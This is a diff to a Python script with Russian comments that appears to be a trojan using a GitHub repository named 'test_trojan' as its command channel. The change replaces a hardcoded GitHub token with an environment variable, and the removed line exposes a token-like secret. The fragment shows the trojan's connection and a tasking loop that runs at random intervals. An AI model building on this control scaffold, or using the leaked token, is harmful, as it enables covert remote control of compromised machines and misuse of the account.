@@ -17,12 +17,14 @@ configured = False
 task_queue = queue.Queue()
 
 # Параметры GitHub
-GITHUB_TOKEN = "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"
+GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
 REPO_OWNER = "An0nimus85"
 REPO_NAME = "test_trojan"
 
 def connect_to_github():
-    print(f"[*] Подключение к GitHub с использованием токена {GITHUB_TOKEN}, владельца репозитория {REPO_OWNER} и имени репозитория {REPO_NAME}")
+    if not GITHUB_TOKEN:
+        raise ValueError("Не установлен токен GitHub. Установите переменную окружения GITHUB_TOKEN.")
+    print(f"[*] Подключение к GitHub с использованием токена, владельца репозитория {REPO_OWNER} и имени репозитория {REPO_NAME}")
     gh = login(token=GITHUB_TOKEN)
     repo = gh.repository(REPO_OWNER, REPO_NAME)
     branch = repo.branch("master")  # Обновите имя ветки на то, которое используется в вашем репозитории
@@ -96,4 +98,3 @@ while True:
             t.start()
             time.sleep(random.randint(1, 10))
     time.sleep(random.randint(5, 20))
-
